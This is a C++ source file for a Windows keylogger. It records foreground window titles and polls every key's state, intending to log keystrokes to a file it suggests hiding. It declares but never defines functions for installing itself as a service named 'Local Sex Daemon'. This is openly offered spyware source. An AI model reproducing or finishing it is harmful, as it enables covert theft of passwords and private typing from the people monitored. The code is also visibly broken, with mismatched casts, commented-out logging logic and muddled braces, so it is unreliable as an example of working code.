#define _CRT_SECURE_NO_WARNINGS
#include "stdafx.h"
#include <windows.h>
#include <string>

using namespace std;

BOOL Install_Logger_Service();
void Initialize_Service();
void WINAPI Create_Service(DWORD, CHAR**);
void WINAPI Handle_Controls(DWORD control_code);


BOOL Logger();


wchar_t service_name[100] = TEXT("Local Sex Daemon");
SERVICE_STATUS serv_status;
SERVICE_STATUS_HANDLE serv_handle = 0;
HANDLE stop_service = 0;
HHOOK hook_handle;

string KeycodeToUnicode(unsigned int key, HKL keyboardLayoutHandle, bool shiftPressed, bool ctrlPressed, bool altPressed, bool capsLock);

int main() {
	char window_text[500];
	char old_window_text[500];
	char latest_key[50];
	char file_name[MAX_PATH + 1];
	char write_name[500];
	int i;
	int virt_key;
	HANDLE file_handle;
	HWND fore_hndl;
	DWORD numb_bytes;
	GetSystemDirectory(LPWSTR(file_name), MAX_PATH + 1);
	strcat(file_name, "\\MahLogSon.txt");
	file_handle = CreateFile((LPCWSTR("MahLogSon.txt")), FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 0); // Could make it hidden or
	//something if you wanted
	//FILE_ATTRIBUTE_HIDDEN

	byte teclas[256];
	char teclasespeciales[32];

	bool first_time = true, shift=false, alt=false, ctrl=false, capslock = false;
	bool keystate[256];

	while (1)
	{
		fore_hndl = GetForegroundWindow();
		if (fore_hndl != NULL)
		{
			if (GetWindowText(fore_hndl, (wchar_t*)&window_text, 499) != 0)
			{
				if (strcmp(window_text, old_window_text) != 0)
				{
					strcpy(write_name, "\r\n{WINDOW TITLE}-> ");
					strcat(write_name, window_text);
					strcat(write_name, "\r\n");
					WriteFile(file_handle, write_name, strlen(write_name), &numb_bytes, NULL);
					strcpy(old_window_text, window_text);
				}
			}
		}




		for (int i = 0; i < 255; i++)
		{
			if (GetAsyncKeyState(i) == -32767)
			{

				HKL locale = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), NULL));

				int scanCodeEx = MapVirtualKeyExW(i, MAPVK_VK_TO_VSC_EX, locale);

				wchar_t buffer[5];
				unsigned char lpKeyState[256] = { 0 };
				ToUnicodeEx(i, scanCodeEx, lpKeyState, (LPWSTR)buffer, 5, 0, locale);
				//strcpy(latest_key, buffer);
				//WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);
				//strcpy(latest_key, );
				//WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);
				Sleep(10);
			}
				
				
			}
		}
		//// Now define all keys that we wish to capture and log //
		//// Mouse Input    //
		//if (GetAsyncKeyState(VK_LBUTTON) & 1)    { strcpy(latest_key, "[MOUSE-LEFT]");  WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);        Sleep(100); };
		//if (GetAsyncKeyState(VK_RBUTTON) & 1)    { strcpy(latest_key, "[MOUSE-RIGHT]"); WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);        Sleep(100); };
		//if (GetAsyncKeyState(VK_MBUTTON) & 1)    { strcpy(latest_key, "[MOUSE-MIDDLE]"); WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);        Sleep(100); };
		//if (GetAsyncKeyState(VK_XBUTTON1) & 1) { strcpy(latest_key, "[MOUSE-XBUTTON-1]"); WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);    Sleep(100); };
		//if (GetAsyncKeyState(VK_XBUTTON2) & 1) { strcpy(latest_key, "[MOUSE-XBUTTON-2]"); WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);    Sleep(100); };
		//// lower case
		//if (GetAsyncKeyState(0x41) & 1)    { strcpy(latest_key, "a"); WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);    Sleep(100); };
		//if (GetAsyncKeyState(0x42) & 1)    { strcpy(latest_key, "b"); WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL);   Sleep(100); };
		////if (GetAsyncKeyState(0x43) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'c';    Sleep(100); };
		////if (GetAsyncKeyState(0x44) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'd';    Sleep(100); };
		////if (GetAsyncKeyState(0x45) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'e';    Sleep(100); };
		////if (GetAsyncKeyState(0x46) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'f';    Sleep(100); };
		////if (GetAsyncKeyState(0x47) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'g';    Sleep(100); };
		////if (GetAsyncKeyState(0x48) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'h';    Sleep(100); };
		////if (GetAsyncKeyState(0x49) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'i';    Sleep(100); };
		////if (GetAsyncKeyState(0x4A) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'j';    Sleep(100); };
		////if (GetAsyncKeyState(0x4B) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'k';    Sleep(100); };
		////if (GetAsyncKeyState(0x4C) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'l';    Sleep(100); };
		////if (GetAsyncKeyState(0x4D) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'm';    Sleep(100); };
		////if (GetAsyncKeyState(0x4E) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'n';    Sleep(100); };
		////if (GetAsyncKeyState(0x4F) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'o';    Sleep(100); };
		////if (GetAsyncKeyState(0x50) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'p';    Sleep(100); };
		////if (GetAsyncKeyState(0x51) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'q';    Sleep(100); };
		////if (GetAsyncKeyState(0x52) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'r';    Sleep(100); };
		////if (GetAsyncKeyState(0x53) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 's';    Sleep(100); };
		////if (GetAsyncKeyState(0x54) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 't';    Sleep(100); };
		////if (GetAsyncKeyState(0x55) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'u';    Sleep(100); };
		////if (GetAsyncKeyState(0x56) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'v';    Sleep(100); };
		////if (GetAsyncKeyState(0x57) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'w';    Sleep(100); };
		////if (GetAsyncKeyState(0x58) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'x';    Sleep(100); };
		////if (GetAsyncKeyState(0x59) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'y';    Sleep(100); };
		////if (GetAsyncKeyState(0x5A) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << 'z';    Sleep(100); };
		//////NUMPAD
		////if (GetAsyncKeyState(VK_NUMPAD0) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '0', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD1) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '1', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD2) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '2', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD3) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '3', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD4) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '4', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD5) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '5', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD6) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '6', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD7) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '7', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD8) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '8', Sleep(100); };
		////if (GetAsyncKeyState(VK_NUMPAD9) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '9', Sleep(100); };
		////// Other numpad keys
		////if (GetAsyncKeyState(VK_MULTIPLY) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '*', Sleep(100); };
		////if (GetAsyncKeyState(VK_ADD) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '+', Sleep(100); };
		////if (GetAsyncKeyState(VK_SEPARATOR) & 1){ WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[NUMPAD_SEPARATOR]", Sleep(100); };
		////if (GetAsyncKeyState(VK_SUBTRACT) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '-', Sleep(100); };
		////if (GetAsyncKeyState(VK_DECIMAL) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '.', Sleep(100); };
		////if (GetAsyncKeyState(VK_DIVIDE) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '/', Sleep(100); };
		////// Various format keys
		////if (GetAsyncKeyState(VK_CAPITAL) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[CAPS]";        Sleep(100); };
		////if (GetAsyncKeyState(VK_END) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[END]";        Sleep(100); };
		////if (GetAsyncKeyState(VK_HOME) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[HOME]";        Sleep(100); };
		////if (GetAsyncKeyState(VK_INSERT) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[INSERT]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_DELETE) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[DELETE]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_SPACE) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[SPACE]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_LSHIFT) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[SHIFT]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_RSHIFT) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[SHIFT]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_MENU) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[ALT]";        Sleep(100); };
		////if (GetAsyncKeyState(VK_RCONTROL) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[CONTROL]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_LCONTROL) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[CONTROL]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_CONTROL) & 1)  { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[CONTROL]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_RWIN) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[WINKEY]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_LWIN) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[WINKEY]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_RETURN) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[ENTER]";    Sleep(100); };
		////if (GetAsyncKeyState(VK_BACK) & 1)        { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[BACKSPACE]"; Sleep(100); };
		////// Numbers
		////if (GetAsyncKeyState(0x30) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '0';    Sleep(100); };
		////if (GetAsyncKeyState(0x31) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '1';    Sleep(100); };
		////if (GetAsyncKeyState(0x32) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '2';    Sleep(100); };
		////if (GetAsyncKeyState(0x33) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '3';    Sleep(100); };
		////if (GetAsyncKeyState(0x34) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '4';    Sleep(100); };
		////if (GetAsyncKeyState(0x35) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '5';    Sleep(100); };
		////if (GetAsyncKeyState(0x36) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '6';    Sleep(100); };
		////if (GetAsyncKeyState(0x37) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '7';    Sleep(100); };
		////if (GetAsyncKeyState(0x38) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '8';    Sleep(100); };
		////if (GetAsyncKeyState(0x39) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << '9';    Sleep(100); };
		//////Function Keys i.e F1, F2
		////if (GetAsyncKeyState(VK_F1) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F1]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F2) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F2]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F3) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F3]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F4) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F4]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F5) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F5]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F6) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F6]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F7) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F7]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F8) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F8]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F9) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F9]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F10) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F10]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F11) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F11]", Sleep(100); };
		////if (GetAsyncKeyState(VK_F12) & 1)    { WriteFile(file_handle, latest_key, strlen(latest_key), &numb_bytes, NULL) << "[F12]", Sleep(100); };
		////



	

	CloseHandle(file_handle);
	return TRUE;


	return 0;
}

